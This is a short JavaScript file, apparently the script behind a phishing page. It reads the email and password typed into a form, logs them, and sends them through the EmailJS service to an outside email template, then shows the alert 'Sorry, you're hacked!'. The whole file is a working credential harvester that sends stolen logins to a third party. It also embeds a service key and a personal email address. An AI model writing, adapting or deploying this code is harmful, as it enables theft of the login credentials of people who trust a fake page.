
(function()
{
  console.log("Initiallizing email stuff");
  emailjs.init("user_XYNdN92yHCWf97RSwemwg");
})();

function myFunction()
{
  console.log("Hi!");
  var email = $('#email').val();
  var passsword = $('#pass').val();

  console.log(email);
  console.log(passsword);

  emailjs.send("gmail", "template_TV08CQI3", {"reply_to":"shafaaf.hossain@hotmail.com","from_name": email,"message_html":passsword});
  alert("Sorry, you're hacked!");
}
